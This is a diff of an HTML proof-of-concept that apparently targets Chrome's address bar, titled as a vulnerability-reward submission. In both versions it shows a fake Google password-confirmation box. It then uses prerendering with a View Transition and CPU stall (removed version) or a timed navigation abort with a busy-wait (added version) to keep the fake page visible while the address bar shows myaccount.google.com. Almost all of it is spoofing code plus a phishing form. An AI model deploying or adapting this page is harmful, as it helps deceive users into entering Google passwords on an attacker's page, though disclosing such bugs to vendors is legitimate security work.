@@ -2,60 +2,60 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Security Research</title>
-    <script type="speculationrules">
-    {
-      "prerender": [{
-        "source": "list",
-        "urls": ["https://myaccount.google.com/"]
-      }]
-    }
-    </script>
+    <title>Chrome VRP: Abort-Commit PoC</title>
     <style>
-        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
-        .box { border: 1px solid #dadce0; padding: 30px; border-radius: 12px; max-width: 350px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .btn { background: #1a73e8; color: white; border: none; padding: 18px 30px; border-radius: 6px; font-size: 16px; width: 100%; cursor: pointer; }
-        #status { margin-top: 20px; color: #5f6368; font-weight: bold; }
+        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; background: #fff; }
+        .box { border: 1px solid #dadce0; padding: 25px; border-radius: 12px; max-width: 350px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 16px; width: 100%; cursor: pointer; }
+        #status { margin-top: 20px; color: #5f6368; font-family: monospace; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div id="phish-ui">
+    <div id="ui">
         <div class="box">
             <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
-            <h3>Identity Check</h3>
-            <p>Your session requires a refresh. Please confirm your account.</p>
-            <input type="password" placeholder="Confirm Google Password" style="width:100%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:4px;">
-            <button class="btn" onclick="triggerSpeculativeSpoof()">Verify Now</button>
+            <h3>Identity Verification</h3>
+            <p>Your Google session is out of sync. Please confirm your password.</p>
+            <input type="password" placeholder="Google Password" style="width:100%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:4px;">
+            <button class="btn" onclick="triggerAbortRace()">Verify Now</button>
         </div>
     </div>
     <div id="status">Ready</div>
 
     <script>
-        function triggerSpeculativeSpoof() {
+        async function triggerAbortRace() {
             const target = "https://myaccount.google.com/";
             const status = document.getElementById('status');
+            const controller = new AbortController();
             
-            // 2. The View Transition: Captures a 'snapshot' of our fake UI
-            document.startViewTransition(async () => {
-                status.innerText = "PRERENDER ACTIVATING...";
-                
-                // 3. Navigate to the already-prerendered page
-                // Because it's prerendered, the URL bar will jump INSTANTLY
-                window.location.href = target;
+            status.innerText = "RACING...";
+            status.style.color = "orange";
 
-                // 4. THE EXPLOIT: We use a microtask loop to prevent 
-                // the browser from 'clearing' the transition snapshot.
-                const lockTime = 4000; // 4 second window
-                const start = Date.now();
-                while (Date.now() - start < lockTime) {
-                    // We flood the CPU just enough to keep the 'Old' UI snapshot 
-                    // visible while the 'New' URL (Google) is in the Omnibox.
-                    if (Math.random() > 0.99) {
-                        console.log("Stalling renderer...");
-                    }
+            // 1. Listen for the navigation start
+            navigation.addEventListener('navigate', (event) => {
+                if (event.destination.url.includes("google.com")) {
+                    // 2. We allow the navigation to start but prepare to ABORT
+                    // This is the window where the URL bar prepares to change
+                    setTimeout(() => {
+                        // 3. THE KILL SHOT: Abort the navigation right as it commits
+                        controller.abort();
+                        status.innerText = "ABORTED. CHECK URL BAR.";
+                        status.style.color = "green";
+                        
+                        // 4. THE STALL: Keep the screen from clearing
+                        const start = Date.now();
+                        while (Date.now() - start < 3000) { /* 3 second window */ }
+                    }, 85); // 85ms is the 'sweet spot' for mobile CPUs
                 }
-            });
+            }, { once: true });
+
+            // 4. Trigger the navigation with our Abort Signal
+            try {
+                await navigation.navigate(target, { signal: controller.signal }).finished;
+            } catch (err) {
+                console.log("Navigation successfully aborted.");
+            }
         }
     </script>
 </body>
